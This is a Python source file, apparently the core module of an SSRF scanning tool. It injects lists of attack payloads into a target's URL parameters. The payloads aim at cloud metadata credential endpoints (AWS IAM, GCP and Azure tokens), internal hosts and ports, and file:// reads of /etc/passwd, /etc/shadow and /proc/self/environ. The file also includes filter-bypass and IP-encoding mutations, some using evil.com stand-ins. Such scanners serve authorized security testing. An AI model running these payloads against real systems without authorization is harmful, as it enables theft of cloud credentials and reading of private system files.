"""
M7 SSRF Scanner — Core scanning logic with payload injection.
Made by Milkyway Intelligence | Author: Sharlix Martin
"""

import asyncio
import json
import os
from typing import Dict, List, Any
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

from m7ssrf.requestor import Requestor
from m7ssrf.analyzer import ResponseAnalyzer
from utils.logger import Logger


# SSRF-sensitive parameter names (auto-discovery patterns)
SSRF_PARAM_PATTERNS = [
    "url", "uri", "path", "src", "source", "dest", "destination",
    "redirect", "next", "return", "returnurl", "returnto", "back",
    "goto", "target", "link", "href", "action", "host", "site",
    "file", "filename", "filepath", "document", "page", "load",
    "data", "feed", "fetch", "proxy", "endpoint", "api", "resource",
    "image", "img", "avatar", "icon", "thumbnail", "preview",
    "callback", "webhook", "notify", "ping", "download", "upload",
    "import", "export", "open", "view", "show", "include",
    "content", "html", "template", "config", "service", "ip",
    "domain", "server", "addr", "address", "request", "remote",
]

# Cloud metadata endpoints
CLOUD_METADATA = {
    "AWS": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://[fd00:ec2::254]/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/public-ipv4",
    ],
    "GCP": [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    ],
    "Azure": [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    ],
    "Digital Ocean": [
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1.json",
    ],
    "Alibaba Cloud": [
        "http://100.100.100.200/latest/meta-data/",
    ],
}

# Localhost / Internal payloads (basic)
LOCALHOST_PAYLOADS = [
    "http://localhost/",
    "http://127.0.0.1/",
    "http://127.1/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://0177.0.0.1/",
    "http://2130706433/",
    "http://0x7f000001/",
    "http://localhost:80/",
    "http://localhost:443/",
    "http://localhost:22/",
    "http://localhost:8080/",
    "http://localhost:3306/",
    "http://localhost:6379/",
    "http://localhost:5432/",
    "http://localhost:27017/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:443/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8443/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:3306/",
]

# Internal network ranges
INTERNAL_PAYLOADS = [
    "http://10.0.0.1/",
    "http://10.0.1.1/",
    "http://192.168.0.1/",
    "http://192.168.1.1/",
    "http://172.16.0.1/",
    "http://172.17.0.1/",
    "http://10.0.0.1:8080/",
    "http://10.0.0.1:80/",
    "http://192.168.1.1:8080/",
]

# Protocol-based payloads
PROTOCOL_PAYLOADS = [
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///etc/shadow",
    "file:///proc/self/environ",
    "file:///proc/version",
    "file:///windows/win.ini",
    "dict://localhost:6379/info",
    "dict://localhost:11211/stats",
    "sftp://localhost:22/",
    "ftp://localhost/",
    "gopher://localhost/",
    "ldap://localhost/",
    "ldaps://localhost/",
]

# Filter bypass payloads
BYPASS_PAYLOADS = [
    "http://127.0.0.1.nip.io/",
    "http://localhost.localadmin.com/",
    "http://spoofed.burpcollaborator.net@127.0.0.1/",
    "http://127.0.0.1%2F",
    "http://127.0.0.1%2523/",
    "http://①②⑦.⓪.⓪.①/",
    "http://0x7f.0x0.0x0.0x1/",
    "http://0177.00.00.01/",
    "http://127.000.000.1/",
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    "http://[::ffff:127.0.0.1]/",
    "http://2130706433/",
    "http://127.1.1.1\\@127.0.0.1/",
    "http://127.0.0.1%00@evil.com/",
    "http://evil.com#127.0.0.1/",
    "http://127.0.0.1%0d%0a/",
    "http://127.0.0.1 /",
    "http://127.0.0.1\t/",
]


def _load_payload_db() -> Dict[str, List[str]]:
    """Load payloads from payload_db.json if it exists."""
    db_path = os.path.join(
        os.path.dirname(os.path.dirname(__file__)),
        "data", "payload_db.json"
    )
    try:
        with open(db_path, "r") as f:
            return json.load(f)
    except Exception:
        return {}


class SSRFScanner:
    """Core scanner: injects payloads and collects results."""

    def __init__(
        self,
        requestor: Requestor,
        analyzer: ResponseAnalyzer,
        logger: Logger,
        args,
    ):
        self.requestor = requestor
        self.analyzer = analyzer
        self.logger = logger
        self.args = args
        self.payload_db = _load_payload_db()

    def _build_payload_list(self) -> List[str]:
        """Build the full payload list based on scan mode."""
        payloads = []

        if self.args.safe:
            # Safe mode: only localhost + cloud metadata
            payloads.extend(LOCALHOST_PAYLOADS[:8])
            for cloud_payloads in CLOUD_METADATA.values():
                payloads.extend(cloud_payloads[:2])
            return list(dict.fromkeys(payloads))  # dedupe

        # Always include localhost
        payloads.extend(LOCALHOST_PAYLOADS)

        # Internal network (not in safe mode)
        if not self.args.safe:
            payloads.extend(INTERNAL_PAYLOADS)

        # Protocol payloads
        payloads.extend(PROTOCOL_PAYLOADS)

        # Bypass payloads
        payloads.extend(BYPASS_PAYLOADS)

        # Cloud metadata
        if self.args.cloud_detect or self.args.full:
            for cloud_payloads in CLOUD_METADATA.values():
                payloads.extend(cloud_payloads)

        # Mutation engine
        if self.args.mutate or self.args.full:
            from m7ssrf.engine import _mutate_payloads_stub
            # Inline mutation (avoid circular import)
            payloads.extend(_generate_mutations())

        # From payload DB
        for category in self.payload_db.values():
            if isinstance(category, list):
                payloads.extend(category)

        # Deduplicate while preserving order
        seen = set()
        unique_payloads = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique_payloads.append(p)

        return unique_payloads

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Replace the value of `param` in `url` with `payload`."""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query, keep_blank_values=True)

        if param in query_params:
            query_params[param] = [payload]
        else:
            query_params[param] = [payload]

        new_query = urlencode(
            {k: v[0] for k, v in query_params.items()},
            quote_via=lambda s, *a, **kw: s  # preserve special chars
        )
        new_parsed = parsed._replace(query=new_query)
        return urlunparse(new_parsed)

    async def scan(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
        """Scan a URL with all payloads across all discovered parameters."""
        results = []
        payloads = self._build_payload_list()

        self.logger.verbose(f"[~] Testing {len(params)} param(s) × {len(payloads)} payloads on {url}")

        tasks = []
        for param in params:
            for payload in payloads:
                tasks.append(
                    self._test_single(url, param, payload)
                )

        chunk_size = self.args.threads * 2
        for i in range(0, len(tasks), chunk_size):
            chunk = tasks[i:i + chunk_size]
            chunk_results = await asyncio.gather(*chunk, return_exceptions=True)
            for r in chunk_results:
                if isinstance(r, dict) and r.get("severity"):
                    results.append(r)

        return results

    async def _test_single(
        self, url: str, param: str, payload: str
    ) -> Dict[str, Any]:
        """Test a single payload on a single parameter."""
        try:
            injected_url = self._inject_payload(url, param, payload)

            response = await self.requestor.get(injected_url)
            if response is None:
                return {}

            analysis = self.analyzer.analyze(
                response=response,
                payload=payload,
                url=injected_url,
            )

            if analysis.get("detected"):
                return {
                    "url": url,
                    "injected_url": injected_url,
                    "param": param,
                    "payload": payload,
                    "status_code": response.get("status_code"),
                    "signal": analysis.get("signal"),
                    "severity": analysis.get("severity"),
                    "evidence": analysis.get("evidence"),
                    "type": "reflected_ssrf",
                }

        except Exception as e:
            self.logger.verbose(f"[!] Error testing {url} param={param}: {e}")

        return {}


def _generate_mutations() -> List[str]:
    """Generate payload mutations from base IPs."""
    mutations = []
    base_targets = [
        ("127.0.0.1", "localhost"),
        ("169.254.169.254", "metadata"),
    ]

    for ip, label in base_targets:
        # Decimal encoding
        parts = ip.split(".")
        if len(parts) == 4:
            decimal = (
                int(parts[0]) * 16777216
                + int(parts[1]) * 65536
                + int(parts[2]) * 256
                + int(parts[3])
            )
            mutations.append(f"http://{decimal}/")

        # Hex encoding
        if len(parts) == 4:
            hex_ip = ".".join(hex(int(p)) for p in parts)
            mutations.append(f"http://{hex_ip}/")

        # Octal encoding
        if len(parts) == 4:
            octal_ip = ".".join(oct(int(p)) for p in parts)
            mutations.append(f"http://{octal_ip}/")

        # IPv6 mapped
        mutations.append(f"http://[::ffff:{ip}]/")
        mutations.append(f"http://[0:0:0:0:0:ffff:{ip}]/")

        # Mixed encoding tricks
        mutations.append(f"http://{ip}%2F")
        mutations.append(f"http://{ip}%2523")
        mutations.append(f"http://{ip}\t/")
        mutations.append(f"http://{ip} /")

        # URL-encoded dots
        encoded_ip = ip.replace(".", "%2e")
        mutations.append(f"http://{encoded_ip}/")

        # Double URL-encoded
        dbl_encoded = ip.replace(".", "%252e")
        mutations.append(f"http://{dbl_encoded}/")

    return mutations
